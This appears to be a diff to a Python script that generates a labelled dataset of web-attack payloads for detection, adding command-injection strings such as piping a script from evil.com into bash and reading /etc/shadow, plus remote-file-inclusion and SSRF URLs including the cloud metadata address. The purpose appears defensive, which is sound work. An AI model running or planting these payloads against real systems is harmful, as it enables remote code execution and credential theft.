@@ -86,7 +86,15 @@ CMDI = [
     "cat /etc/passwd | id",
     "`whoami`",
     "$(whoami)",
-    "ping -c 1 127.0.0.1 && id"
+    "ping -c 1 127.0.0.1 && id",
+    "cat /etc/passwd",
+    "wget http://attacker.com/shell.sh",
+    "curl http://evil.com/payload.sh | bash",
+    "cat /etc/shadow",
+    "ls; cat /etc/passwd",
+    "whoami && id",
+    "$(cat /etc/passwd)",
+    "`cat /etc/shadow`"
 ]
 
 LFI = [
@@ -100,14 +108,23 @@ LFI = [
 RFI = [
     "http://evil.com/shell.txt",
     "https://malicious.site/backdoor.php",
-    "http://attacker.com/payload.php"
+    "http://attacker.com/payload.php",
+    "https://evil.com/shell.php",
+    "http://malicious.com/backdoor.asp",
+    "https://attacker.site/payload.sh",
+    "http://hacker.ru/shell.php?cmd=id",
+    "https://xss.evil.com/inject.php"
 ]
 
 SSRF = [
     "http://127.0.0.1/admin",
     "http://localhost:8080",
     "http://169.254.169.254/latest/meta-data/",
-    "http://127.0.0.1:8000/internal"
+    "http://127.0.0.1:8000/internal",
+    "http://0.0.0.0/internal",
+    "http://localhost/metadata",
+    "http://169.254.169.254/metadata/v1",
+    "http://127.0.0.1:22"
 ]
 
 NORMAL = [
@@ -156,14 +173,14 @@ def generate(label, payload_pool, severity, count):
 def main():
     dataset = []
 
-    dataset += generate("NORMAL", NORMAL, "LOW", 600)
+    dataset += generate("NORMAL", NORMAL, "LOW", 800)
 
-    dataset += generate("SQLI", SQLI, "HIGH", 400)
-    dataset += generate("XSS", XSS, "HIGH", 400)
-    dataset += generate("CMDI", CMDI, "CRITICAL", 400)
-    dataset += generate("LFI", LFI, "HIGH", 300)
-    dataset += generate("RFI", RFI, "HIGH", 300)
-    dataset += generate("SSRF", SSRF, "CRITICAL", 300)
+    dataset += generate("SQLI",  SQLI,  "HIGH",     400)
+    dataset += generate("XSS",   XSS,   "HIGH",     400)
+    dataset += generate("CMDI",  CMDI,  "CRITICAL", 400)
+    dataset += generate("LFI",   LFI,   "HIGH",     400)
+    dataset += generate("RFI",   RFI,   "HIGH",     400)
+    dataset += generate("SSRF",  SSRF,  "CRITICAL", 400)
 
     random.shuffle(dataset)
 
